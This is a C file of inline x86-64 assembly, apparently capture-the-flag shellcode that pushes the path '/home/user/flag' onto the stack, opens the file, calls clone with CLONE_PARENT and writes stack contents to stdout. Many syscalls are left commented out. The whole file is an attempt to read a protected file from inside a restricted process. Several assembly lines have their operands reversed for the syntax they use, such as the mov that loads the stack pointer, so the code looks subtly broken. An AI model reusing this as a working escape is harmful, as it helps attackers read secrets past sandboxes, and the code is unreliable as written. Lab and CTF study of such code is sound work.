#define _GNU_SOURCE
#include <unistd.h>
#include <stdint.h>
#include <syscall.h>
#include <sys/stat.h>
#include <sched.h>
void sc() {
    uint32_t zero = 0;
    uint32_t two = 2;
    uint32_t four = 4;
    uint32_t sixteen = 16;

    uint32_t ret = 0;
    uint32_t fd_1 = 1;
    uint32_t pid_2 = 2;
    uint32_t err = 0;

    uint32_t nocare = 0;

    struct stat stat_out;

    // push '/home/user/flag' to the stack
    asm volatile (
      "movabs %%rax, 0x0067616c662f7265\n\t"
      "push %%rax\n\t"
      "movabs %%rax, 0x73752f656d6f682f\n\t"
      "push %%rax"
      :
      :
      : "rax", "memory");
    // write stack to fd_1 (stdout)
    asm volatile (
      "mov %%rsi, %%rsp\n\t"
      "syscall"
      : "=a"(ret), "=d"(err)
      : "a"(__NR_write), "D"(fd_1), "d"(sixteen)
      : "rsi", "memory");
    // open fd for flag file
    asm volatile (
      "mov %%rdi, %%rsp\n\t"
      "syscall"
      : "=a"(ret), "=d"(err)
      : "a"(__NR_open), "S"(zero), "d"(zero)
      : "rdi", "rcx", "memory");

    // push P * 16 to stack
    asm volatile (
      "pop %%rax\n\t"
      "pop %%rax\n\t"
      "movabs %%rax, 0x0050505050505050\n\t"
      "push %%rax\n\t"
      "movabs %%rax, 0x5050505050505050\n\t"
      "push %%rax\n\t"
      "movabs %%rax, 0x5050505050505050\n\t"
      "push %%rax"
      :
      :
      : "rax", "memory");

    // clone
    asm volatile (
      "syscall"
      : "=a"(ret)
      : "a"(__NR_clone), "D"(CLONE_PARENT), "S"(0)
      : "rcx", "memory");

//    // write stack to fd_1
//    asm volatile (
//      "mov %%rsi, %%rsp\n\t"
//      "syscall"
//      :
//      : "a"(__NR_read), "D"(3), "d"(sixteen)
//      : "rsi", "rcx", "memory");

    // write stack to fd_1
    asm volatile (
      "mov %%rsi, %%rsp\n\t"
      "syscall"
      :
      : "a"(__NR_write), "D"(fd_1), "d"(sixteen)
      : "rsi", "rcx", "memory");

//    // fstat fd for flag file
//    asm volatile (
//      "syscall"
//      : "=a"(ret), "=d"(err)
//      : "a"(__NR_fstat), "D"(ret), "S"(&stat_out)
//      : "rcx", "memory");
//    // write size of flag file
//    asm volatile (
//      "syscall"
//      : "=a"(ret)
//      : "a"(__NR_write), "D"(fd_1), "S"(&(stat_out.st_size)), "d"(sizeof(off_t))
//      : "rcx", "memory");



//    asm volatile (
//      "syscall"
//      : "=a"(nocare)
//      : "a"(__NR_write), "D"(fd_1), "S"(&ret), "d"(four)
//      : "memory");
//    asm volatile (
//      "syscall"
//      : "=a"(nocare)
//      : "a"(__NR_write), "D"(fd_1), "S"(&err), "d"(four)
//      : "memory");
//    asm volatile (
//      "syscall"
//      :
//      : "a"(__NR_write), "D"(fd_1), "S"(&err), "d"(4)
//      : "memory");
//    asm volatile (
//      "syscall"
//      : "=a"(nocare)
//      : "a"(__NR_write), "D"(fd_1), "S"(&ret), "d"(4)
//      : "memory");
//    asm volatile (
//      "syscall"
//      : "=a"(nocare)
//      : "a"(__NR_write), "D"(fd_1), "S"(&err), "d"(4)
//      : "memory");
//    asm volatile (
//      "syscall"
//      : "=a"(ret)
//      : "a"(__NR_write), "D"(fd_1), "S"(&(stat_out.st_size)), "d"(sizeof(off_t))
//      : "memory");
}

